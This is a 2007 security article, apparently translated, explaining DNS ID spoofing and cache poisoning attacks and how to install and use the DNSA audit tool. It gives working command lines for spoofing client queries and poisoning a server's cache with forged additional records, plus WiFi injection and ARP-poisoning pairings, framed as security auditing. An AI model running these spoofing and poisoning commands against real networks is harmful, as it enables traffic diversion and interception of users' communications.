---
weight: 999
url: "/Audits_de_sécurité_du_protocole_DNS/"
title: "DNS Protocol Security Audits"
description: "Learn about DNS protocol security audits, methods to identify vulnerabilities, and how to use the DNSA tool for testing DNS servers."
categories: ["Security", "Network", "DNS"]
date: "2007-12-23T23:04:00+02:00"
lastmod: "2007-12-23T23:04:00+02:00"
tags: ["DNS", "Security", "Audit", "DNSA", "Network"]
toc: true
---

## Introduction to DNS Protocol Security

DNS is used in most local networks; however, it was developed with strong performance constraints at the expense of security, to avoid degrading regular traffic due to the substantial number of queries associated with the nature of this protocol.

DNS ([Domain Naming System](https://fr.wikipedia.org/wiki/Domain_Name_System)) is one of the key protocols of the Internet, along with several major routing protocols, notably BGPv4 ([Border Gateway Protocol](https://fr.wikipedia.org/wiki/Border_Gateway_Protocol)). It is also used in most current local networks with, depending on the chosen topology, one or more internal DNS server(s).

This older protocol was not developed with strong security constraints, but mainly performance constraints. The criterion at that time was optimizing performance that would generally not degrade traffic due to the high frequency of these requests.

As DNS is at the center of all IP communications (how could the Internet work today without name resolution?), it represents a pillar of communications and is therefore a prime target for attackers wishing to divert traffic to listen to it, modify it, or directly inject into it.

DNS, in its original version - which is still the most commonly used - has several intrinsic flaws that cannot be fixed unless using [DNSSec](https://www.dnssec.net/) or combining different security layers at several different levels ([IPSec](https://fr.wikipedia.org/wiki/IPsec), etc.).

However, it is possible to considerably limit the risks by adapting the network topology (Local Area Network, demilitarized zone DMZ, etc.). Secondary DNS servers (updated with the famous "zone transfers") can also be the target of attacks aimed at a particular network.

Most DNS transactions take place on port 53/UDP, except for queries that are too large or zone transfers that go through port 53/TCP. Throughout this article, the attacks and countermeasures described almost exclusively concern UDP packets of DNS traffic.

DNSA (DNS Auditing tool) is a "swiss army knife" of security from the perspective of name resolution. It can be used in conjunction with a vulnerability scanner to identify different DNS servers (primary and secondary), identify server types and versions, etc.

Tools such as DIG ([Domain Information Groper](https://www.linux.com/articles/113992)), host, or nslookup allow interactive querying of DNS servers and thus collect a lot of information that will then be useful for processing with DNSA.

## Highlighting DNS Vulnerabilities

DNS vulnerabilities can be exploited through DNS ID Spoofing attacks and intrinsic conceptual attacks on the DNS protocol. The attacks in this paper are based on spoofing to execute privilege escalation; the Cache Poisoning attack example concerns the corruption of the "additional record" field.

The DNS flaws addressed in this article are all implemented in the DNSA tool. For DNS ID Spoofing attacks, these are conceptual attacks intrinsic to the DNS protocol. As with all so-called "Spoofing" attacks, the goal is to impersonate a third party in order to gain additional privileges.

In all the attacks presented below, "spoofing" is used so that the machine running DNSA passes for the legitimate DNS server being queried. For the DNS Cache Poisoning attack (DNS cache corruption), the one retained in the DNSA tool is the corruption of the "additional record" field.

### Capturing a Standard and Reverse DNS Query

```bash
root@linbox]# tcpdump -i eth0 udp and port 53
tcpdump: listening on ath0
linbox.32783 > ns1.fai.fr.domain: 30679+ A? www.google.fr. (30) (DF)
ns1.fai.fr.domain > linbox.32783: 30679 2/5/1 CNAME[|domain] (DF)
ns1.fai.fr.domain > linbox.32784: 25190* 1/4/4 (224) (DF)
linbox.32785 > ns1.fai.fr.domain: 30680+ PTR? 99.9.102.66.in-addr.arpa. (42) (DF)
```

A standard DNS query is a type A query. A is a hostname, CNAME an alias, MX a mail server, etc... It is also possible to perform reverse queries with PTR records to find out the hostname of a machine from its IP.

### DNS ID Spoofing

The DNS ID Spoofing attack primarily uses:

- The weaknesses of the UDP protocol, which ensures no integrity or packet tracking. Traffic injections are therefore possible without having prior information;
- Knowledge or low randomness of the DNS ID, the only information encoded on 16 bits, or 65,535 possible combinations, allowing the recognition of the response to a sent query.
- In the case of a known DNS ID (same Ethernet segment, DMZ compromise, etc.), the DNS ID Spoofing attack is trivial by using the information retrieved from listening to DNS traffic and then forging the response as it would have been sent by the legitimate server.
- For an unknown DNS ID (typical Internet case with 2 remote clients for example), attacks are possible by reducing the window of possible DNS IDs in the case of low randomness with so-called prediction attacks. Such attacks have already been implemented on TCP sequence numbers ([p0f, the passive OS recognition tool using this technique](https://freshmeat.net/redir/p0f/43121/url%5C_homepage/p0f.shtml)) and can be extended to the DNS case.

### DNS ID of a DNS Transaction

In a typical attack, considering that the DNS ID can be retrieved by passive traffic listening, the principle is simple:

- The attacker is listening for DNS queries
- When the query to be diverted is issued, it extracts the DNS ID
- It then forges an adequate response with an IP/UDP/DNS packet having the necessary payload, that is, containing the source IP of the legitimate DNS server, the destination IP of the client that issued the query, the DNS ID recovered above, and the information it wishes to insert.

All the "engines" of current operating systems' name resolution work the same way: they take into account the first response to a query made and then ignore subsequent responses. This is the case here: DNSA responding before the legitimate name server (because it is optimized to respond very quickly thanks to the libpcap call-back functions), the legitimate server's query is then ignored.

### DNS ID Spoofing Attack on a DNS Server

Since a DNS server can behave like a client when it doesn't have the information in cache, it can be diverted in the same way as a classic client with a DNS ID Spoofing attack. The necessary (and sufficient!) condition for the attack to be carried out is to be placed on the same Ethernet segment as the attacked server.

Several scenarios are possible (compromising a DMZ machine, a LAN client...). Detailed examples were presented at the 2005 Symposium on [Security of Information and Communication Technologies and Systems](https://actes.sstic.org/SSTIC05/Protocoles_reseau/SSTIC05-Betouin_Blancher_Fischbach-Protocoles_reseau.pdf)...

### DNS Cache Poisoning

When a client queries its name server, if it has the information in cache ("host www.hote.com is available at IP address x.x.x.x"), it responds directly. Otherwise, the server behaves like a standard client to query the DNS server responsible for the domain.

This then responds with the requested information, and can, if configured to do so, include additional records (addRR) to avoid an overload of future queries. This "option" was first integrated without checking the domains registered in additional records.

A server could therefore respond by including addRRs that did not concern the domain for which it was responding. Flow diversion is then possible: a server controlled by a malicious user could, for example, return an additional record concerning the domain microsoft.com and thus making it point to the machine of his choice.

### Payload of a DNS Packet

```
Byte
 
|---------------|---------------|---------------|---------------|
1 2 3 4
ID (cont) QR,OP,AA,TC,RD RA,0,AD,CD,CODE
|---------------|---------------|---------------|---------------|
4 # Questions 5 (Cont) 6 # Answers 7 (Cont)
|---------------|---------------|---------------|---------------|
8 # Authority 9 (Cont) 10 # Additional 11 (Cont)
|---------------|---------------|---------------|---------------|
Question Section
|---------------|---------------|---------------|---------------|
Answer Section
|---------------|---------------|---------------|---------------|
Authority Section
|---------------|---------------|---------------|---------------|
Additional Section addRR Field
|---------------|---------------|---------------|---------------|
```

The payload of a DNS packet (here after the IP and then UDP headers) consists of different fields:

- The transaction ID (DNS ID), a 2-byte field.
- Various "flags" set to define the type of DNS packet: query, response, etc...
- The number of "questions" asked.
- The number of "answers" given.
- The questions
- The answers.
- The name servers (NS for Name Server) responsible for the zone.
- The famous additional field in which various complementary information can be provided.

## Installation and Configuration of DNSA

dnsa-ng-0.6 uses the libnet-ng and libpcap libraries, which should be pre-installed preferably with the development versions to have the most recent header files. Also find explanations and details on the low-level functioning of the DNSA tool (DNS Auditing Tool).

DNSA is available on the securitech.homeunix.org site in tar.gz archive format. It uses the libnet libraries (libnet-ng in its recent versions) and libpcap, which must be installed beforehand.

The installation details will focus on the latest version: dnsa-ng-0.6.

The installation of [libpcap](https://www.tcpdump.org/) can be done, on the vast majority of architectures/distributions, via packages (deb, rpm, ...).

However, make sure to install the development version (generally, depending on the distributions, suffixed by "-dev" or "-devel") to have the header files, help, "man" pages, etc...

The libnet-ng - Libnet Next Generation - is available at the following address [https://www.security-labs.org/libnetng](https://www.security-labs.org/libnetng). Its installation is done via the sources (available tar.gz archives).

For a standard installation, the procedure is as follows:

```bash
tar -zxvf ng-libnet-current.tar.gz
cd libnet-ng
./configure
make
make install
```

The "make install" is optional because the path to the libnet-ng directory can be specified as an argument during the installation of DNSA. DNSA requires superuser rights (root) to function, so it is advised to install libnet-ng including the "make install" phase.

Indeed, it is not possible for a "normal" user to forge packets and send them on an interface of their choice, nor to passively listen to traffic captured by the network interface.

The installation of DNSA can begin:

```bash
tar -zxvf dnsa-ng-0.6.tar.gz
cd dnsa-ng-0.6
cd sources
./configure
```

Verbosity and debug mode are accessible by compiling DNSA with the options --with-ldflags=-lefence and --enable-debug. It is possible to set the paths to libpcap or libnet-ng with the arguments "--with-libnet=[PATH]" and "--with-libpcap=[PATH]"

```bash
make
make install
```

### Files

DNSA comes with detailed documentation allowing it to be used optimally.
docs/ contains articles related to DNS flaws as well as usage examples.
sources/ contains all DNSA source codes and the binary after compilation.
man/ is currently empty in the latest version

### "Low-Level" Operation

DNSA can be used in 3 different modes:

- "DNS ID Spoofing" DNSA was originally created to highlight the simplicity of DNS ID Spoofing attacks. This mode is generally used on the same ethernet segment, even if additional attacks can [allow very evolved schemes](https://actes.sstic.org/SSTIC05/Protocoles_reseau/SSTIC05-Betouin_Blancher_Fischbach-Protocoles_reseau.pdf).
- "DNS ID Sniffing" This mode mainly allows statistical analyses on the distributions of DNS IDs according to the servers or OSes used. Indeed, if the randomness of DNS ID distributions were dependent on older servers, the randomness is now handled by the operating system on which the server runs. An example based on gnuplot, an opensource plotting software, is described in the DNSA documentation. Future evolutions of the software will integrate different statistical tests based on multiple linear regressions.
- "DNS cache poisoning" This mode is intended for servers vulnerable to these types of attacks. These include notably older Bind, MS Windows, or more recently proprietary firewall appliances. The principle is to respond to the attacked server with forged additional records containing information relating to domains different from the one being queried. Countermeasures to this type of attack are therefore easy to implement. Fortunately, fewer and fewer servers are vulnerable to DNS cache poisoning attacks.

The latest version of DNSA supports attacks on wireless networks, through two 802.11 cards. New patches on different drivers ([madwifi notably](https://madwifi.org/)), allow simultaneous listening and injection. The "WiFi" mode allows listening to DNS traffic on the first card, and injecting forged frames thanks to the second. The "ether" mode is the standard mode using pcap filters to select the appropriate content.

DNSA doesn't have an event engine. It uses the call-back functions of the lipcap library: the principle is to trigger, when specific packets defined with pcap filters pass, a function containing the payload of the captured packet as well as various other arguments:

```c
void callback_dnsspoof(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *packet)
{
(…)
}
```

Packets are forged using libnet(-ng) and its predefined constructors for the majority of known protocols.

## Using DNSA

Description of the exploitation, with DNSA, of the attacks presented in part 2 of the "DNS Auditing Tool" file. Examples of exploitation with DNSA are available in Ethernet version and WIFI version.

### General Presentation

```
Usage: ./dnsa-ng [OPTIONS]
DNS Swiss knife tool
 
REQUIRED : -m [mode] where mode can be raw4 or link (depending of your network topology)
REQUIRED : -t [media] where media can be 'wifi' or 'ether'
* 'wifi' : needs 2 cards as describe in the documentation, needs the -I option to specify the interface which will inject packets
* 'ether' : doesn't need further options)
 
-1 DNS ID spoofing [ Required : -S ]
-D [www.domain.org] Hostname query to fool.
Don't use it if every DNS request sniffed has to be spoofed
-S [IP] IP address to send for DNS queries
-s [IP] IP address of the host to fool
-i [interface] IP address to send for DNS queries
 
-2 DNS IDs Sniffing [ Required : -s ] (Beta and not finished)
-s [IP] IP address of the server which makes queries
-w [file] Output file for DNS IDs
 
-3 DNS cache poisoning [ Required : -S AND -a AND -b]
-a [host.domain.org] Hostname to send in the additional record
-b [IP] IP to send in the additional record
-D [www.domain.org] Hostname for query. Use it if you want to fool just one
-S [IP] IP address to send for DNS queries (the normal one)
-s [IP] IP address of the server to fool
-i [interface] IP address to send for DNS queries
 
-h Print usage
Bug reports to Pierre BETOUIN
```

### Usage

Mode "-1" concerns DNS ID Spoofing attacks.

#### Ethernet Usage

```
./dnsa-ng -m [raw4 or link] -1 -D [DOMAIN OR MACHINE NAME] -S IP_TO_SEND -s CLIENT_TO_TRICK -i INTERFACE -t ether
```

The "-S" and "-s" arguments are therefore filters to refine the restrictions of clients to attack. If they are not specified, all DNS queries will be affected.

#### WiFi Usage

```
./dnsa-ng -m [raw4 or link] -1 -D [DOMAIN OR MACHINE NAME] -S IP_TO_SEND -s CLIENT_TO_TRICK -i ath0 -t wifi -I wlan0
```

WiFi usage is the same, except for the specification of interfaces. In WiFi mode, one interface captures the raw traffic and another is responsible for injecting traffic. The "-i" interface passively captures traffic while the "-I" interface injects forged packets. Mode "-3" concerns the DNS cache poisoning attacks described above, the generic command for this attack is as follows:

```
./dnsa-ng -t ether -m [raw4 or link] -3 -D [HOST SOUGHT] -S [LEGITIMATE IP OF THE HOST] -s [DNS SERVER PERFORMING THE QUERY] -a [ADDRR TO ADD] -b [IP OF THE ADDRR TO ADD] -i [INTERFACE]
```

The following example concerns a query made on the pirate.org domain looking for the hostname "hacker" with IP 100.101.102.103. The DNS server performing the search is server 192.168.1.100. The additional record concerns the FQDN www.microsoft.com by assigning it the IP 1.2.3.4. The injection interface is the eth0 network card.

```
./dnsa-ng -t ether -m [raw4 or link] -3 -D hacker.pirate.org -S 100.101.102.103 –s 192.168.1.100 -a www.microsoft.com -b 1.2.3.4 -i eth0
```

After DNS cache corruption, we can see that the server has cached the forged information:

```bash
$ ping www.microsoft.com
PING www.microsoft.com (1.2.3.4): 56 data bytes
```

## Conclusion

DNS is a protocol sensitive to traffic diversion. Its position, traffic, and the ease of exploitation of attacks concerning it make it an essential element whose security level can be audited using DNSA, although countermeasures are not simple to implement.

DNS is a protocol of choice for malicious users wishing to divert traffic. Its abundant use and the simplicity of possible attacks make it a very sensitive element of the infrastructure.

DNSA allows auditing the security level of DNS exchanges with an offensive approach as it would be in the case of a real attack.

However, countermeasures are not simple to implement: the most widespread currently being DNSSec which uses asymmetric encryption to guarantee the integrity and authenticity of exchanges.

DNSA can also be coupled with other tools such as [arp-sk](https://www.arp-sk.org/) to bypass switches ([ARP cache poisoning](https://www.google.fr/custom?hl=fr&client=pub-7670419794937883&channel=3516851159&cof=FORID%3A1%3BGL%3A1%3BS%3Ahttp%3A%2F%2Fsecuobs.com%3BLH%3A14%3BLW%3A50%3BT%3A%23336699%3BLC%3A%23440066%3BVLC%3A%23d03500%3BGALT%3A%239A2C06%3BGFNT%3A%23223472%3BGIMP%3A%23223472%3BDIV%3A%2333FFFF%3B&domains=www.secuobs.com&sig=nkGK4imLEyzEpn7g&flav=0000&ie=ISO-8859-1&oe=ISO-8859-1&q=arp+cache+poisoning&btnG=Rechercher&sitesearch=www.secuobs.com&meta=)), [dsniff](https://monkey.org/~dugsong/dsniff/), [ettercap](https://www.secuobs.com/news/04102006-ettercap.shtml), etc.

The possibilities are multiple. A very realistic scenario was presented at [SSTIC 2005](https://actes.sstic.org/SSTIC05/Protocoles_reseau/SSTIC05-Betouin_Blancher_Fischbach-Protocoles_reseau.pdf) with the total compromise of a classic architecture (DMZ + LAN) from a Web server, to all client workstations of the LAN.

## References

[https://www.secuobs.com/news/19122007-dnsa.shtml](https://www.secuobs.com/news/19122007-dnsa.shtml)
